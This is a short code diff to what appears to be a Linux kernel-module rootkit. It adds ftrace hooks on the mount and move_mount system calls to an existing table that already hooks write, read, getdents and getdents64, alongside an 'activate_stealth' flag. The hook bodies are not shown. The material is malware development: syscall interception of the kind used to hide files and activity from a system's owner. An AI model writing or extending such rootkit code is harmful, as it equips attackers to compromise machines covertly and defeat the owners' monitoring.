@@ -1,7 +1,7 @@
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
-
+#include "hooks/mounts.h"  
 #include "include/headers.h"
 #include "ftrace/ftrace.h"
 #include "hooks/read.h"
@@ -51,7 +51,8 @@ static int activate_stealth = 1;
 static struct ftrace_hook all_hooks[] = {
     HOOK("__x64_sys_write", hooked_write, &orig_write),
     HOOK("__x64_sys_read", hooked_read, &orig_read),
-    
+    HOOK("__x64_sys_mount", hook_mount, &orig_mount),
+    HOOK("__x64_sys_move_mount", hook_move_mount, &orig_move_mount),
     HOOK("__x64_sys_getdents64", hooked_getdents64, &orig_getdents64),
     HOOK("__x64_sys_getdents", hooked_getdents, &orig_getdents),
     
